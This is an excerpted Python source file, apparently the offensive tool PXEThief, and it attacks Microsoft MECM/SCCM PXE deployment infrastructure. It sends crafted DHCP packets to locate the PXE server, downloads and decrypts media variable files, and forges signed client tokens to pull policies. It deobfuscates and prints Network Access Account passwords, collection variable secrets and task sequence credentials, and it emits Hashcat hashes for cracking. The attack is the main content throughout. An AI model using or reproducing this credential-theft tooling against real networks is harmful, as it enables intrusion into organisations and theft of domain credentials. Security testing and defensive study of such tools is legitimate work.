    ...
    try:
        ...
        try:
            ...
            print(
                "[-] "
                + input
                + " does not appear to be a valid hostname or IP address (or DNS does not resolve)"
            )
            sys.exit(0)
...
def print_interface_table():
    print(
        "[!] Set the interface to be used by scapy in manual_interface_selection_by_id in the settings.ini file"
    )
    print()
...
def configure_scapy_networking(ip_address):
    ...
    if ip_address is not None:
        ...
        if scapy_config.get("manual_interface_selection_by_id"):
            try:
                manual_selection_mode_id = scapy_config.getint(
                ...
                print(
                    "Valid interfaces and interface indexes can be checked by running pxethief.py 10"
                )
                sys.exit(-1)
        else:
        ...
        if manual_selection_mode_id:
            print(
                "[+] Attemting to use Interface ID "
                + str(manual_selection_mode_id)
                + " provided in setttings.ini"
            )
            ...
            if selection_mode == 2 or try_next_mode:
                ...
                for interface in interfaces:
                    ...
                    if (
                        ip
                        and not (ip in loopback_range)
                        and not (ip in autoconfigure_ranges)
                    ):
...
def find_pxe_server():
    ...
    if ans:
        ...
        if tftp_server:
            tftp_server = tftp_server.rstrip(b"\0").decode(
                "utf-8"
            ...
            boot_file = next(
                (
                    opt[1]
                    for opt in dhcp_options
                    if isinstance(opt, tuple) and opt[0] == "boot-file-name"
                ),
                None,
            )
            if boot_file:
                boot_file = boot_file.rstrip(b"\0").decode(
                    "utf-8"
...
def get_variable_file_path(tftp_server):
    ...
    pkt = (
        IP(src=clientIPAddress, dst=tftp_server)
        / UDP(sport=68, dport=4011)
        / BOOTP(ciaddr=clientIPAddress, chaddr=clientMacAddress)
        / DHCP(
            options=[
                ...
                (
                    250,
                    binascii.unhexlify("0c01010d020800010200070e0101050400000011ff"),
                ),  # x64 private option
                ...
                (
                    ...
                    b"\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2",
    ...
    )  # sr return value: ans,unans/packetpair1,packetpair2 (i.e. PacketPairList)/sent packet,received packet/Layers(Ethernet,IP,UDP/TCP,BOOTP,DHCP)
    ...
    if ans:
        ...
        if variables_file:
            ...
            # If the first byte is set to 2, this is the encrypted key stream that is used to encrypt the media file. The location of the media file follows later in the option field
                ...
                variables_file = variables_file[
                    beginning_of_string_index : beginning_of_string_index
                    + string_length
                ]
                variables_file = variables_file.decode("utf-8")
            bcd_file = (
                next(
                    opt[1]
                    for opt in dhcp_options
                    if isinstance(opt, tuple) and opt[0] == 252
                )
                .rstrip(b"\0")
                .decode("utf-8")
        ...
        print(
            "[-] No DHCP responses recieved from MECM server "
            + tftp_server
            + ". This may indicate that the wrong IP address was provided or that there are firewall restrictions blocking DHCP packets to the required ports"
        )
        sys.exit(-1)
...
def get_pxe_files(ip):
    ...
    if BLANK_PASSWORDS_FOUND:
        ...
        auto_exploit_blank_password = general_config.getint(
...
def CryptDecryptMessage(pfx, data):
    ...
    key_algo = digested_data["recipient_infos"].native[0]["key_encryption_algorithm"][
        "algorithm"
    ]
    key = b""
    ...
    iv = digested_data["encrypted_content_info"]["content_encryption_algorithm"][
        "parameters"
    ].native
    ciphertext = digested_data["encrypted_content_info"]["encrypted_content"].native
    decrypted_data = b""
    enc_algo = digested_data["encrypted_content_info"]["content_encryption_algorithm"][
        "algorithm"
    ].native
...
def decrypt_media_file(path, password):
    ...
    try:
        ...
        decrypted_media_file = media_crypto.aes128_decrypt(
            encrypted_file[:last_16], key[:16]
        )
        decrypted_media_file = decrypted_media_file[
            : decrypted_media_file.rfind("\x00")
        ]
        ...
        print(
            "[-] Failed to decrypt media variables file. Check the password provided is correct"
        )
        sys.exit(-1)
...
def use_encrypted_key(encrypted_key, media_file_path):
    ...
    key = media_crypto.aes_des_key_derivation(
        key_data
    )  # Derive key to decrypt key bytes in the DHCP response

    var_file_key = media_crypto.aes128_decrypt_raw(
        encrypted_bytes[:16], key[:16]
    )[
        :10
...
def dowload_and_decrypt_policies_using_certificate(guid, cert_bytes):
    ...
    CCMClientTimestamp = (
        datetime.datetime.now(datetime.UTC).replace(microsecond=0).isoformat() + "Z"
    )
    ...
    try:
        naaConfigs, tsConfigs, colsettings = (
            make_all_http_requests_and_retrieve_sensitive_policies(
                CCMClientID,
    ...
    for colsetting in colsettings:
        ...
        for instance in instances:
            encrypted_collection_var_secret = instance.xpath(
                ".//*[@name='Value']/value"
            )[0].text
            collection_var_name = instance.xpath(".//*[@name='Name']/value")[0].text

            print("\n[!] Collection Variable Name: '" + collection_var_name + "'")
            collection_var_secret = deobfuscate_credential_string(
                encrypted_collection_var_secret
            )
            collection_var_secret = collection_var_secret[
                : collection_var_secret.rfind("\x00")
            ]
...
def process_naa_xml(naa_xml):
    ...
    for naa_settings in network_access_account_xml:
        network_access_username = deobfuscate_credential_string(
            naa_settings.xpath(".//*[@name='NetworkAccessUsername']")[0]
            .find("value")
            .text
        )
        network_access_username = network_access_username[
            : network_access_username.rfind("\x00")
        ]
        print("[!] Network Access Account Username: '" + network_access_username + "'")

        network_access_password = deobfuscate_credential_string(
            naa_settings.xpath(".//*[@name='NetworkAccessPassword']")[0]
            .find("value")
            .text
        )
        network_access_password = network_access_password[
            : network_access_password.rfind("\x00")
        ]
...
def process_task_sequence_xml(ts_xml):
    ...
    if ts_sequence_tag[:9] == "<sequence":
        ...
        try:
            ...
            print(
                "Failed to decrypt TS_Sequence in '"
                + pkg_name
                + "'. The encryption used on the SCCM server may be different than expected?"
            )
            return

    tsSequence = tsSequence[: tsSequence.rfind(">") + 1]
    tsSequence = "".join(
        c for c in tsSequence if c.isprintable() or c in keepcharacters
    ).rstrip()

    if DUMP_TS_XML:
        print(
            "[!] Writing decrypted TaskSequence policy XML to 'TaskSequence_policy_"
            + tsName
            + ".xml'."
        )
    ...
    if DUMP_TS_Sequence_XML:
        print(
            "[!] Writing decrypted TS_Sequence XML to '"
            + tsName
            + ".xml'. This can be manually inspected for credentials"
        )
...
def make_all_http_requests_and_retrieve_sensitive_policies(
    CCMClientID,
    CCMClientIDSignature,
    CCMClientTimestamp,
    CCMClientTimestampSignature,
    ...
    first_payload = b"\xff\xfe" + (
        "<Msg><ID/><SourceID>"
        + clientID
        + '</SourceID><ReplyTo>direct:OSD</ReplyTo><Body Type="ByteRange" Offset="0" Length="728"/><Hooks><Hook2 Name="clientauth"><Property Name="Token"><![CDATA[ClientToken:'
        + CCMClientID
        + ";"
        + CCMClientTimestamp
        + "\r\nClientTokenSignature:"
    ...
    second_payload = (
        '<RequestAssignments SchemaVersion="1.00" RequestType="Always" Ack="False" ValidationRequested="CRC"><PolicySource>SMS:'
        + sitecode
        + '</PolicySource><ServerCookie/><Resource ResourceType="Machine"/><Identification><Machine><ClientID>'
        + clientID
        + "</ClientID><NetBIOSName></NetBIOSName><FQDN></FQDN><SID/></Machine></Identification></RequestAssignments>\r\n"
    ...
    r = session.request(
        "CCM_POST",
        sccm_base_url + "/ccm_system/request",
        data=me,
    ...
    for policyAssignment in policyAssignments:
        ...
        for policy in policies:
            if (
                policy.get("PolicyCategory") not in allPoliciesURLs
                and policy.get("PolicyCategory") is not None
            ):
                allPoliciesURLs[policy.get("PolicyCategory")] = policy.find(
                    "PolicyLocation"
                ).text.replace("http://<mp>", sccm_base_url)
            else:
                if policy.get("PolicyCategory") is None:
                    allPoliciesURLs[
                        "".join(
                            i for i in policy.get("PolicyID") if i not in "\/:*?<>|"
                        )
                    ] = policy.find("PolicyLocation").text.replace(
                        "http://<mp>", sccm_base_url
                    )
                else:
                    allPoliciesURLs[policy.get("PolicyCategory") + str(dedup)] = (
                        policy.find(
                            "PolicyLocation"
                        ).text.replace("http://<mp>", sccm_base_url)
                    )
    ...
    headers["ClientToken"] = "{};{}".format(
        CCMClientID.upper(), now.strftime(dateFormat1)
    )
    headers["ClientTokenSignature"] = (
        CryptoTools.signNoHash(
            key,
            "{};{}".format(CCMClientID.upper(), now.strftime(dateFormat1)).encode(
                "utf-16"
            )[2:]
            + "\x00\x00".encode("ascii"),
        )
        .hex()
        .upper()
    )
...
"""
    ...
    if len(sys.argv) < 2 or sys.argv[1] == "-h":
        ...
        print(
            "%s 8 - Write new default settings.ini file in PXEThief directory"
            % sys.argv[0]
        )
        print(
            "%s 10 - Print Scapy interface table to identify interface indexes for use in 'settings.ini'"
            % sys.argv[0]
        )
        ...
        print(
            "[+] Finding and downloading encrypted media variables file from MECM server..."
        )
        ...
        print(
            "[+] Generating and downloading encrypted media variables file from MECM server located at "
            + sys.argv[2]
        )
        ...
        smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text
        smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
        smsTSMediaPFX = binascii.unhexlify(
            root.find('.//var[@name="_SMSTSMediaPFX"]').text
        )
        filename = smsMediaSiteCode + "_" + smsMediaGuid + "_SMSTSMediaPFX.pfx"
        ...
        if not (len(sys.argv) == 4 or len(sys.argv) == 5):
            print(
                "Usage:   %s 4 <variables-file-name> <policy-file-path> <password>"
                % sys.argv[0]
            )
            sys.exit(0)
        ...
        print(
            "Hashcat hash: "
            + "$sccm$aes128$"
            + media_crypto.read_media_variable_file_header(sys.argv[2]).hex()
        )

    elif int(sys.argv[1]) == 6:
        print(
            "[+] Using MECM PXE Certificate registry key values to retrieve task sequences"
        )
        ...
        print(
            "[+] Writing new 'settings.ini' file to PXEThief folder with default values"
        )
